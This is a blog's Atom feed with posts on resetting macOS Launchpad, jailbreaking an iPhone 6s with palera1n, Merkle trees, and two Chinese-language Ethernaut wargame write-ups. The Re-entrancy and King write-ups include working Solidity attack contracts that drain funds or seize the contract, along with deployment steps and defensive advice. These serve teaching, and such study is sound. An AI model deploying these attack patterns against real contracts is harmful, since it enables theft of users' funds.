<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Alex Lin&#39;s Notes</title>
  
  <subtitle>Strategy, Execution, Communication.</subtitle>
  <link href="https://chaosky.tech/atom.xml" rel="self"/>
  
  <link href="https://chaosky.tech/"/>
  <updated>2025-07-23T20:16:56.000Z</updated>
  <id>https://chaosky.tech/</id>
  
  <author>
    <name>Alex Lin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Reset Launchpad on MacOS</title>
    <link href="https://chaosky.tech/2025/07/23/Reset-Launchpad-on-MacOS/"/>
    <id>https://chaosky.tech/2025/07/23/Reset-Launchpad-on-MacOS/</id>
    <published>2025-07-23T20:16:56.000Z</published>
    <updated>2025-07-23T20:16:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>Before MacOS 15.5, resetting Launchpad was a straightforward process using the Terminal command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.dock ResetLaunchPad -bool <span class="literal">true</span>; killall Dock</span><br></pre></td></tr></table></figure><p>However, starting with MacOS 15.5, this command no longer works as expected. If you find that Launchpad is not functioning correctly or you want to reset it to its default state, you can follow these steps:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> find 2&gt;/dev/null /private/var/folders/ -<span class="built_in">type</span> d -name com.apple.dock.launchpad -<span class="built_in">exec</span> <span class="built_in">rm</span> -rf &#123;&#125; +; killall Dock</span><br></pre></td></tr></table></figure><h3 id="Steps-to-Reset-Launchpad"><a href="#Steps-to-Reset-Launchpad" class="headerlink" title="Steps to Reset Launchpad"></a>Steps to Reset Launchpad</h3><p>To reset Launchpad on macOS Sequoia, follow these steps:</p><ol><li><strong>Open Terminal</strong>: Find Terminal in Applications &gt; Utilities or use Spotlight to search for it.</li><li><strong>Enter Command</strong>: Type the following command and press Enter:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> find 2&gt;/dev/null /private/var/folders/ -<span class="built_in">type</span> d -name com.apple.dock.launchpad -<span class="built_in">exec</span> <span class="built_in">rm</span> -rf &#123;&#125; +; killall Dock</span><br></pre></td></tr></table></figure><ul><li>You’ll need to enter your administrator password when prompted.</li></ul></li><li><strong>Verify Reset</strong>: Open Launchpad to check if it has reset, with Apple’s default apps on the first page.</li></ol><p><strong>Note</strong>: This method requires administrator privileges and may not fully rearrange third-party apps alphabetically, but it should reset Apple’s default apps effectively.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Before MacOS 15.5, resetting Launchpad was a straightforward process using the Terminal command:&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;tabl</summary>
      
    
    
    
    <category term="MacOS" scheme="https://chaosky.tech/categories/MacOS/"/>
    
    
    <category term="Launchpad" scheme="https://chaosky.tech/tags/Launchpad/"/>
    
    <category term="Troubleshooting" scheme="https://chaosky.tech/tags/Troubleshooting/"/>
    
  </entry>
  
  <entry>
    <title>10. Re-entrancy</title>
    <link href="https://chaosky.tech/2022/11/22/10-Re-entrancy/"/>
    <id>https://chaosky.tech/2022/11/22/10-Re-entrancy/</id>
    <published>2022-11-22T12:28:38.000Z</published>
    <updated>2022-11-22T12:28:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>Chain: Goerli<br>Difficulty: ●●●○○<br>Level: <a href="https://ethernaut.openzeppelin.com/level/0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb">https://ethernaut.openzeppelin.com/level/0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb</a></p><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>这一关的目标是偷走合约的所有资产.</p><p>这些可能有帮助:</p><ul><li>不可信的合约可以在你意料之外的地方执行代码.</li><li>Fallback methods</li><li>抛出&#x2F;恢复 bubbling</li><li>有的时候攻击一个合约的最好方式是使用另一个合约.</li><li>查看上方帮助页面, “控制台之外” 部分</li></ul><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析合约代码，关键点在于 <code>withdraw</code> 函数中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br></pre></td></tr></table></figure><p>这里犯了常见的错误：未考虑调用者为另一个合约的情况。如果该合约在 <code>fallback()</code> 中调用相同的函数就会发生 Re-entrancy attack。</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><ol><li><p>首先打开Console，获取当前关卡合约实例地址 <code>instance</code>；</p></li><li><p>打开 <a href="https://remix.ethereum.org/">Remix IDE</a>，创建文件 <code>10_Re-entrancy.sol</code>，粘贴以下代码：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">interface IReentrance &#123;</span><br><span class="line">    function withdraw(uint256 _amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract HackReentrance &#123;</span><br><span class="line">    address levelInstance;</span><br><span class="line"></span><br><span class="line">    constructor(address _levelInstance) &#123;</span><br><span class="line">        levelInstance = _levelInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claim(uint256 _amount) public &#123;</span><br><span class="line">        IReentrance(levelInstance).withdraw(_amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        IReentrance(levelInstance).withdraw(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        IReentrance(levelInstance).withdraw(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在constructor 填入当前关卡合约实例地址后部署。</p></li><li><p>为了保证被攻击合约余额能取空，查看被攻击合约余额 <code>await getBalance(instance)</code> </p></li><li><p>调用 <code>donate</code> 函数将ETH存入被攻击合约，在 Console 里执行：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await contract.donate(&quot;刚部署的攻击合约地址&quot;, &#123;value: 被攻击合约余额&#125;)</span><br></pre></td></tr></table></figure></li><li><p>回到 <a href="https://remix.ethereum.org/">Remix IDE</a>，再调用 <code>claim</code> 函数：</p><ul><li>value 填入调用 <code>donate</code> 函数的值</li></ul></li><li><p>完成关卡。</p></li></ol><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>Re-entrancy attack 是一种最常见的攻击。<a href="https://github.com/OpenZeppelin/exploit-uniswap">这里</a> 就介绍了 UniSwap 在V1 时如何受到 Re-entrancy attack。</p><p>要防止 Re-entrancy attack，最简单的办法是使用使用<a href="https://openzeppelin.com/">OpenZeppelin</a>的 <a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard">ReentrancyGuard</a>。</p><h4 id="S01-重入攻击-WTF学院"><a href="#S01-重入攻击-WTF学院" class="headerlink" title="S01. 重入攻击 | WTF学院"></a><a href="https://wtf.academy/solidity-application/S01_ReentrancyAttack/">S01. 重入攻击 | WTF学院</a></h4><p>为了防止转移资产时的重入攻击, 使用 <a href="https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern">Checks-Effects-Interactions pattern</a> 注意 <code>call</code> 只会返回 false 而不中断执行流. 其它方案比如 <a href="https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard">ReentrancyGuard</a> 或 <a href="https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment">PullPayment</a> 也可以使用.</p><p><code>transfer</code> 和 <code>send</code> 不再被推荐使用, 因为他们在 Istanbul 硬分叉之后可能破坏合约 <a href="https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/">Source 1</a> <a href="https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742">Source 2</a>.</p><p>总是假设资产的接受方可能是另一个合约, 而不是一个普通的地址. 因此, 他有可能执行了他的payable fallback 之后又“重新进入” 你的合约, 这可能会打乱你的状态或是逻辑.</p><p>重进入是一种常见的攻击. 你得随时准备好!</p><h4 id="The-DAO-Hack"><a href="#The-DAO-Hack" class="headerlink" title="The DAO Hack"></a><strong>The DAO Hack</strong></h4><p>著名的DAO hack 使用了重进入攻击, 窃取了受害者大量的 ether. 参见 <a href="https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942">15 lines of code that could have prevented TheDAO Hack</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Chain: Goerli&lt;br&gt;Difficulty: ●●●○○&lt;br&gt;Level: &lt;a href=&quot;https://ethernaut.openzeppelin.com/level/0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb</summary>
      
    
    
    
    <category term="Web3" scheme="https://chaosky.tech/categories/Web3/"/>
    
    
    <category term="ethernaut" scheme="https://chaosky.tech/tags/ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>iOS 完全越狱指南（iPhone 6s 15.7.1）</title>
    <link href="https://chaosky.tech/2022/11/21/iOS-Complete-Jailbreak-Guide/"/>
    <id>https://chaosky.tech/2022/11/21/iOS-Complete-Jailbreak-Guide/</id>
    <published>2022-11-21T12:21:21.000Z</published>
    <updated>2022-11-21T12:21:21.000Z</updated>
    
    <content type="html"><![CDATA[<p>手上有一台 iPhone 6S 15.7.1 的设备准备越狱做一些测试。</p><p> GitHub和twitter上找到一个解决方案，并且在我的设备上成功越狱。<a href="https://github.com/palera1n/palera1n">https://github.com/palera1n/palera1n</a></p><h3 id="必读"><a href="#必读" class="headerlink" title="必读"></a>必读</h3><p>不同的设备将需要不同的步骤来越狱您的 iOS 设备。此页面将帮助您找到从哪里开始。</p><p><a href="https://ios.cfw.guide/get-started/">https://ios.cfw.guide/get-started/</a></p><p><strong>以下步骤以 iPhone 6s 15.7.1 为例：</strong></p><span id="more"></span><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ul><li><p>**在运行 palera1n 之前，您必须从 App Store 安装 <a href="https://apps.apple.com/app/tips/id1069509450">提示</a> 应用程序。**因为脚本将其替换为 Amy 编写的名为 Pogo 的加载器应用程序。</p></li><li><p>设备：iOS 15.0 ~ 15.7.1（A8 ~ A11）</p><ul><li>A10 和 A11，在越狱状态必须禁用密码</li></ul></li><li><p>MacOS 运行环境：</p><ul><li><p>安装 Python 3</p></li><li><p>安装依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">brew install libimobiledevice</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">brew install ideviceinstaller</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>其他准备工作可参考官方 <a href="https://github.com/palera1n/palera1n/blob/main/README.md">README</a></p></li></ul><h3 id="开始越狱"><a href="#开始越狱" class="headerlink" title="开始越狱"></a>开始越狱</h3><ol><li><p>clone 代码：<code>git clone --recursive https://github.com/palera1n/palera1n &amp;&amp; cd palera1n</code></p></li><li><p>运行：<code>./palera1n.sh --tweaks &lt;iOS version you&#39;re on&gt; --semi-tethered</code></p><ul><li>在运行此命令之前将您的设备置于 DFU 模式，进入DFU模式可参考 <a href="https://www.i4.cn/news_detail_21378.html">各型号iPhone手机进入DFU模式方法教程</a></li><li><code>semi-tethered</code> 标志使用 5-10GB 的存储空间，并且与 16GB 设备不兼容，如果您使用的是 16GB 设备或可用空间少于 10GB ，<strong>请不要在命令中包含 –semi-tethered 。</strong></li><li>如果您有 iPhone 7 或 iPhone 8，<strong>请不要在命令中包含 –semi-tethered</strong>，即使您满足上述使用标志的条件。</li><li>如果您有仅支持 WiFi 的 iPad 或 iPod Touch，<strong>请在命令中包含 –no-baseband</strong>。</li></ul></li><li><p>然后您的设备将启动到 ramdisk，它将替换 Tips 应用程序和转储 blob。它还将设置引导参数和其他变量，并为 tether 做好准备或设置伪造的 rootfs。它还会为您修补内核，因此您可以使用调整。</p></li><li><p>如果回到恢复&#x2F;正常模式后，需要再次将设备置于 DFU 模式</p></li><li><p>设备将重启，打开 Tips 应用程序，然后点击安装</p></li><li><p>Sileo 应该出现在您的主屏幕上</p><ul><li>如果没有，请单击“工具”并选择“全部执行”</li></ul></li></ol><p>一旦 palera1n 完成，tweaks 就可以用了。</p><h3 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h3><img src="IMG_083E48B070B0-1.jpeg" alt="IMG_083E48B070B0-1" style="zoom:50%;" /><img src="IMG_E7ED3E8BB712-1.jpeg" alt="IMG_E7ED3E8BB712-1" style="zoom:50%;" />]]></content>
    
    
    <summary type="html">&lt;p&gt;手上有一台 iPhone 6S 15.7.1 的设备准备越狱做一些测试。&lt;/p&gt;
&lt;p&gt; GitHub和twitter上找到一个解决方案，并且在我的设备上成功越狱。&lt;a href=&quot;https://github.com/palera1n/palera1n&quot;&gt;https://github.com/palera1n/palera1n&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;必读&quot;&gt;&lt;a href=&quot;#必读&quot; class=&quot;headerlink&quot; title=&quot;必读&quot;&gt;&lt;/a&gt;必读&lt;/h3&gt;&lt;p&gt;不同的设备将需要不同的步骤来越狱您的 iOS 设备。此页面将帮助您找到从哪里开始。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ios.cfw.guide/get-started/&quot;&gt;https://ios.cfw.guide/get-started/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;以下步骤以 iPhone 6s 15.7.1 为例：&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="iOS" scheme="https://chaosky.tech/categories/iOS/"/>
    
    
    <category term="Jailbreak" scheme="https://chaosky.tech/tags/Jailbreak/"/>
    
  </entry>
  
  <entry>
    <title>9. King</title>
    <link href="https://chaosky.tech/2022/11/13/9-King/"/>
    <id>https://chaosky.tech/2022/11/13/9-King/</id>
    <published>2022-11-13T12:29:14.000Z</published>
    <updated>2022-11-13T12:29:14.000Z</updated>
    
    <content type="html"><![CDATA[<p>Chain: Goerli<br>Difficulty: ●●●○○<br>Level: <a href="https://ethernaut.openzeppelin.com/level/0x25141B6345378e7558634Cf7c2d9B8670baFA417">https://ethernaut.openzeppelin.com/level/0x25141B6345378e7558634Cf7c2d9B8670baFA417</a></p><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.</p><p>这么有趣的游戏, 你的目标是攻破他.</p><p>当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public payable &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address payable) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析合约代码，关键点在于 <code>receive</code> 函数中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">king.transfer(msg.value);</span><br></pre></td></tr></table></figure><p>这里犯了常见的错误：未考虑调用者 <code>king</code> 为另一个合约的情况。如果该合约未定义 <code>fallback()</code> 和 <code>receive()</code> 函数，<code>transfer()</code> 就会失败，会自动<code>revert</code>（回滚交易）。</p><p>因此只要有一个未定义 <code>fallback()</code> 和 <code>receive()</code> 函数的合约占用king，合约在 transfer 时失败，令king的地址永远属于该合约。</p><p>另一个关键点是，King 合约的 receive 有复杂的逻辑， 而</p><p><code>solidity</code>三种发送<code>ETH</code>的方法：<code>transfer</code>，<code>send</code>和<code>call</code>。</p><ul><li><code>call</code>没有<code>gas</code>限制，最为灵活，是最提倡的方法；</li><li><code>transfer</code>有<code>2300 gas</code>限制，但是发送失败会自动<code>revert</code>交易，是次优选择；</li><li><code>send</code>有<code>2300 gas</code>限制，而且发送失败不会自动<code>revert</code>交易，几乎没有人用它。</li></ul><p>因此只能用 <code>call</code> 函数进行调用。</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><ol><li><p>首先打开Console，获取当前关卡合约实例地址 <code>instance</code>；</p></li><li><p>打开 <a href="https://remix.ethereum.org/">Remix IDE</a>，创建文件 <code>9_King.sol</code>，粘贴以下代码：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">contract HackKing &#123;</span><br><span class="line">    error CallFailed();</span><br><span class="line">    address levelInstance;</span><br><span class="line"></span><br><span class="line">    constructor(address _levelInstance) payable &#123;</span><br><span class="line">        levelInstance = _levelInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function give() external payable &#123;</span><br><span class="line">        (bool success,) = levelInstance.call&#123;value: msg.value&#125;(&quot;&quot;);</span><br><span class="line">        if(!success)&#123;</span><br><span class="line">            revert CallFailed();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在constructor 填入当前关卡合约实例地址后部署。</p></li><li><p>再调用 <code>give</code> 函数：</p><ul><li>获取当前King 合约的 prize <code>await getBalance(instance)</code> 为 0.001 ether</li><li>VALUE 需要大于或者等于 0.001 ether</li><li>手动调高 GAS LIMIT，不然调用合约会因为 out of gas 失败</li></ul></li><li><p>查看 King 合约的king是否为HackKing 合约。</p></li><li><p>完成关卡。</p></li></ol><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>大多数 Ethernaut 的关卡尝试展示真实发生的 bug 和 hack (以简化过的方式).</p><p>关于这次的情况, 参见: <a href="https://www.kingoftheether.com/thrones/kingoftheether/index.html">King of the Ether</a> 和 <a href="http://www.kingoftheether.com/postmortem.html">King of the Ether Postmortem</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Chain: Goerli&lt;br&gt;Difficulty: ●●●○○&lt;br&gt;Level: &lt;a href=&quot;https://ethernaut.openzeppelin.com/level/0x25141B6345378e7558634Cf7c2d9B8670baFA417</summary>
      
    
    
    
    <category term="Web3" scheme="https://chaosky.tech/categories/Web3/"/>
    
    
    <category term="ethernaut" scheme="https://chaosky.tech/tags/ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>默克尔树（Merkle Tree）</title>
    <link href="https://chaosky.tech/2022/11/09/merkle-tree/"/>
    <id>https://chaosky.tech/2022/11/09/merkle-tree/</id>
    <published>2022-11-09T16:09:47.000Z</published>
    <updated>2022-11-09T16:09:47.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="默克尔树"><a href="#默克尔树" class="headerlink" title="默克尔树"></a>默克尔树</h2><p>默克尔树结构用很小的成本就能有效验证数据集的完整性。</p><h3 id="什么是Merkle树？"><a href="#什么是Merkle树？" class="headerlink" title="什么是Merkle树？"></a>什么是Merkle树？</h3><p>默克尔树是一种树状结构，树上的每个节点都由一个值表示，这个值是一些加密哈希函数的结果。哈希函数是单向的，从一个输入产生一个输出很容易，但从一个输出确定一个输入在计算上是不可行的。默克尔树有3种类型的节点，如下所示：</p><ul><li><p>叶子节点 - 叶子节点位于树的最底部，它们的值是原始数据根据指定的哈希函数进行哈希的结果。一棵树上有多少个叶子节点，就有多少个需要哈希的原始数据。例如，如果有7个数据需要被哈希，就会有7个叶子节点。</p></li><li><p>父节点 - 父节点可以位于树的不同层次，这取决于整个树的大小，父节点总是位于叶节点之上。父节点的值是由它下面的节点的哈希值决定的，通常从左到右开始。由于不同的输入总是会产生不同的哈希值，不考虑哈希值的碰撞，节点哈希值的连接顺序很重要。值得一提的是，根据树的大小，父节点可以Hash其他父节点。</p></li><li><p>根节点 - 根节点位于树的顶端，由位于它下面的两个父节点的哈希值连接而成，同样从左到右开始。任何默克尔树上都只有一个根节点，根节点拥有根哈希值。</p></li></ul><p><img src="/2022/11/09/merkle-tree/2880.webp" alt="默克尔树结构"></p><span id="more"></span><p>Visualization of Merkle Tree</p><p><img src="/2022/11/09/merkle-tree/43616375-15330c32-9671-11e8-9057-6e61c312c856.png" alt="Merkle Tree"></p><p>Visualization of Merkle Tree Proof</p><p><img src="/2022/11/09/merkle-tree/43616387-27ec860a-9671-11e8-9f3f-0b871a6581a6.png" alt="Merkle Tree Proof"></p><p>Visualization of Invalid Merkle Tree Proofs</p><p><img src="/2022/11/09/merkle-tree/43616398-33e20584-9671-11e8-9f62-9f48ce412898.png" alt="Merkle Tree Proof"></p><p>Visualization of Bitcoin Merkle Tree</p><p><img src="/2022/11/09/merkle-tree/43616417-46d3293e-9671-11e8-81c3-8cdf7f8ddd77.png" alt="Merkle Tree Proof"></p><h3 id="Merkle-树实现（JavaScript）"><a href="#Merkle-树实现（JavaScript）" class="headerlink" title="Merkle 树实现（JavaScript）"></a>Merkle 树实现（JavaScript）</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>官方库地址：<a href="https://github.com/merkletreejs/merkletreejs">https://github.com/merkletreejs/merkletreejs</a></p><p>安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install merkletreejs</span><br></pre></td></tr></table></figure><h3 id="构建树"><a href="#构建树" class="headerlink" title="构建树"></a>构建树</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">MerkleTree</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;merkletreejs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">SHA256</span> = <span class="built_in">require</span>(<span class="string">&#x27;crypto-js/sha256&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> leaves = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>].<span class="title function_">map</span>(<span class="function"><span class="params">x</span> =&gt;</span> <span class="title class_">SHA256</span>(x))</span><br><span class="line"><span class="keyword">const</span> tree = <span class="keyword">new</span> <span class="title class_">MerkleTree</span>(leaves, <span class="title class_">SHA256</span>)</span><br><span class="line"><span class="keyword">const</span> root = tree.<span class="title function_">getRoot</span>().<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(tree.<span class="title function_">toString</span>())</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(root)</span><br></pre></td></tr></table></figure><ol><li>衍生出我们的叶子节点。在一棵树上位于叶子节点正上方的每个父节点，最多只能Hash两个叶子节点。如果叶子节点的数量不均匀，父节点将处理一个叶子节点。每个叶子节点应该是某种形式的Hash数据，我们这里使用sha256来哈希所有数据。</li><li>对所有数据进行了哈希后，从而获得了我们的叶子节点 leaves，现在就可以创建Merkle树对象。我们使用merkletreejs库，通过调用new MerkleTree()函数，将叶子节点作为第一个参数，哈希算法作为第二个参数。</li><li>现在已经得出了一个完整的Merkle树，可以通过调用Merkle树对象的getRoot()方法来获得根哈希值。记住，Merkle树的根哈希值是树上根节点正下方的两个前面的父节点的哈希值。</li></ol><p>Merkle树的巧妙之处在于，它不需要任何关于原始数据块的知识来验证一个节点是否属于我们的树。如果我们试图验证一个叶子节点属于我们的树，只需要知道直接相邻的叶子节点哈希值(如果有的话)，以及叶子节点正上方相邻的父节点哈希值就可以了。这个信息被称为proof。</p><h3 id="生成证明和验证"><a href="#生成证明和验证" class="headerlink" title="生成证明和验证"></a>生成证明和验证</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> leaf = <span class="title class_">SHA256</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> proof = tree.<span class="title function_">getProof</span>(leaf)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(tree.<span class="title function_">verify</span>(proof, leaf, root)) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> verified = <span class="title class_">MerkleTree</span>.<span class="title function_">verify</span>(proof, leaf, root, <span class="title class_">SHA256</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title 